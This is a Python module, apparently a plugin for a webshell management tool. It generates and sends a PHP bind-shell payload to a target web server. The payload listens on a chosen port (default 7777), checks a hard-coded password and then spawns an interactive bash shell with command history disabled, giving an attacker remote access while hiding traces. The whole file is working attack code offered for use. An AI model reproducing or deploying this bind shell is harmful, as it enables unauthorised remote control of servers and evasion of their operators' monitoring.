from libs.config import alias, color
from libs.myapp import send, is_windows
from threading import Thread
from time import sleep


def get_php(port, passwd):
    return """$pass="%s";
$port="%s";
$socket = stream_socket_server('tcp://0.0.0.0:'.$port, $errno, $errstr, STREAM_SERVER_BIND|STREAM_SERVER_LISTEN);
if ($socket === false) {
    echo "Bind error";
    die(1);
}
$processes = array();
while (1) {
    $current = @stream_socket_accept($socket, 5, $host);
    if ($current !== false) {
        stream_socket_sendto($current, "password:>");
        $pwd = trim(stream_get_contents($current, strlen($pass)+1));
        if ($pwd === $pass){
            $io = array(
                0 => $current,
                1 => $current,
                2 => $current
                );
            stream_socket_sendto($current, "password correct\\n");
            $proc = proc_open('unset HISTFILE;date;uname -a;bash -i', $io, $pipes);
            $processes[] = array($current, $proc);
        }
        else{
            stream_socket_sendto($current, "password error");
            fflush($current);
            fclose($current);
        }
    }
    foreach ($processes as $k=>$v) {
        $status = proc_get_status($v[1]);
        if (false === $status['running']) {
            fflush($v[0]);
            fclose($v[0]);
            proc_close($v[1]);
            unset($processes[$k]);
        }
    }
}""" % (passwd, port)


@alias(True, func_alias="bs")
def run(port: int = 7777, passwd: str = "doughnuts"):
    """
    bind shell

    (Only for *unix) Bind a port and wait for someone to connect to get a shell.

    eg: bindshell {port=7777} {passwd=doughnuts}
    """
    if (is_windows()):
        return
    t = Thread(target=send, args=(get_php(str(port), passwd), ))
    t.setDaemon(True)
    t.start()
    sleep(1)
    if (t.isAlive()):
        print(f"\nBind {port} {color.green('success')}. Password is {color.green(passwd)}\n")
    else:
        print(f"\nBind {port} {color.red('error')}.\n")
